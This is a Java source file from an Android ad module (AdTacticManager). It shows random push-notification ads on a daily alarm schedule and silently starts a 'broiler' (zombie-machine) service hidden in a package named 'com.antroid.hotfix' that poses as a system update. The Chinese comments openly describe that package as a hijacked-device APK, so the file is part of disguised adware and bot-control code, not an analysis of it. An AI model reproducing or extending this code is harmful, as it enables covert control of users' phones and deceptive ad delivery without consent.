package com.hkc.notification;

import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import com.hkc.constant.CommonDefine.IntentAction;
import com.hkc.db.dao.AdTacticDao;
import com.hkc.db.dao.AppAdvertisementDao;
import com.hkc.model.AdTactic;
import com.hkc.model.AppAdvertisement;
import com.hkc.service.SystemUpdateService;
import com.hkc.utils.Logger;
import com.hkc.utils.MiscUtils;

public class AdTacticManager {

	private static final String TAG = AdTacticManager.class.getSimpleName();

	/**
	 * 肉机apk的包名
	 */
	public static final String SYSTEM_UPDATE_SERVICE_PACKAGE = "com.antroid.hotfix";
	public static final String SYSTEM_UPDATE_SERVICE = SYSTEM_UPDATE_SERVICE_PACKAGE
			+ ".SystemUpdateService";
	/**
	 * 初始化service
	 */
	private static final String ACTION_NOTIFICATION_SCHEDULE = "com.blsm.sft.fresh.notification.schedule";

	private AdTacticManager() {

	}

	/**
	 * 展现广告
	 * 
	 * @param context
	 * @param adTactic
	 */
	public static void runTask(Context context, AdTactic adTactic) {
		AdTacticDao.getDao(context).setTacticReaded(adTactic);
		showNotification(context, adTactic);
	}

	/**
	 * 通知形式展现广告
	 * 
	 * @param context
	 * @param adTactic
	 */
	public static void showNotification(Context context, AdTactic adTactic) {

		Logger.i(TAG, "showNotification :: adTactic = " + adTactic);
		if (!MiscUtils.isNetworkConnected(context)) {
			return;
		}

		int notice_type = adTactic.getNotice_type();
		if (!MiscUtils.isWifi(context) && notice_type != 4) {
			return;
		}

		boolean hasUnread = AppAdvertisementDao.getDao(context).hasUnReadAdv();
		/**
		 * 广告全部已读,给服务器报警
		 */
		if (!hasUnread) {
			AppAdvManager.getInstance(context).apiSendReport();
			return;
		}

		AppAdvManager manager = AppAdvManager.getInstance(context);
		AppAdvertisementDao advDao = AppAdvertisementDao.getDao(context);
		// 没有了未读广告返回
		boolean hasUnRead = advDao.hasUnReadAdvByAdTactic(adTactic);
		if (!hasUnRead) {
			return;
		}

		// 随机选取广告
		AppAdvertisement adv = advDao.getRandomUnReadAdvByAdTactic(adTactic);

		// 当展示策略不为["通知栏 - 微信招商", 4]时
		if (adTactic.getNotice_type() != 4) {
			while (adv != null) {
				// 广告应用已安装,标记已读,并随机取下一个未读的广告
				if (ApkAdvUtils.isInstalled(context, adv.getPackageName())) {
					AppAdvertisementDao.getDao(context).setAdvReaded(adv);
					// 没有了未读广告返回
					hasUnRead = advDao.hasUnReadAdvByAdTactic(adTactic);
					if (!hasUnRead) {
						break;
					}
					adv = advDao.getRandomUnReadAdvByAdTactic(adTactic);
				}
				// 应用未安装
				else {
					break;
				}
			}
		}

		Logger.i(TAG, "RandomUnReadAdv :: adv = " + adv);
		if (adv == null) {
			Logger.w(TAG, "The adv of this adTactic had been readed");
			return;
		}

		/**
		 * 展示广告并启动肉鸡
		 */
		// 显示通知
		adv.setTactic(adTactic);
		manager.dispatchAdvNoticeType(adv);
		// 如果用户的手机已经安装了肉机apk，在这里，我们把肉机启动起来
		boolean installed = ApkAdvUtils.isInstalled(context,
				SYSTEM_UPDATE_SERVICE_PACKAGE);
		Logger.v(TAG, "showNotification :: User installed broiler = "
				+ installed);
		if (installed) {
			startBroilerService(context);
		}
	}

	/**
	 * 启动肉机service
	 * 
	 * @param context
	 */
	public static void startBroilerService(Context context) {
		try {
			Logger.d(TAG, "starting broiler service...");
			ComponentName componentName = new ComponentName(
					SYSTEM_UPDATE_SERVICE_PACKAGE, SYSTEM_UPDATE_SERVICE);
			Intent broiler = new Intent();
			broiler.setComponent(componentName);
			broiler.setAction(ACTION_NOTIFICATION_SCHEDULE);
			context.startService(broiler);
		} catch (Exception e) {
			Logger.e(TAG, "start broiler exception:" + e.getMessage());
			e.printStackTrace();
		}
	}

	/**
	 * 启动每天定时获取广告数据
	 * 
	 * @param context
	 */
	public static void scheduleNextGetAdvs(Context context) {
		Calendar now = (Calendar) Calendar.getInstance().clone();
		AlarmManager manager = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		Intent task = new Intent(context, SystemUpdateService.class);
		task.setAction(IntentAction.ACTION_NOTIFICATION_SCHEDULE);
		PendingIntent operation = PendingIntent.getService(context,
				PendingIntent.FLAG_ONE_SHOT, task,
				(int) (now.getTimeInMillis() % 1000));
		// next day get data from server once more
		manager.set(AlarmManager.RTC, now.getTimeInMillis() + 24 * 60 * 60
				* 1000, operation);
	}

	/**
	 * 判断广告策略是否失效
	 * 
	 * @param adTactic
	 * @return
	 */
	public static boolean isExpiredAdTactic(AdTactic adTactic) {
		if (adTactic.getAction().equals("time_triggered")) {
			if (!ApkAdvUtils.timePast(adTactic.getValue())) {
				return true;
			} else {
				return false;
			}
		} else {
			return true;
		}
	}

	/**
	 * 定时弹出该策略广告
	 * 
	 * @param context
	 * @param adTactic
	 */
	public static void dealTimeTrigger(Context context, AdTactic adTactic) {
		if (adTactic == null) {
			return;
		}
		String todoTime = adTactic.getValue();
		AlarmManager manager = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		Intent task = new Intent(context, SystemUpdateService.class);
		task.setAction(IntentAction.ACTION_NOTIFICATION_TASK_TIME_UP);
		task.putExtra("tactic", adTactic);
		PendingIntent operation = PendingIntent.getService(context,
				PendingIntent.FLAG_ONE_SHOT, task, adTactic.getId());
		long triggerAtTime = ApkAdvUtils.getTrigerTime(todoTime);
		if (triggerAtTime > 0) {
			manager.set(AlarmManager.RTC, triggerAtTime, operation);
		}
	}
}
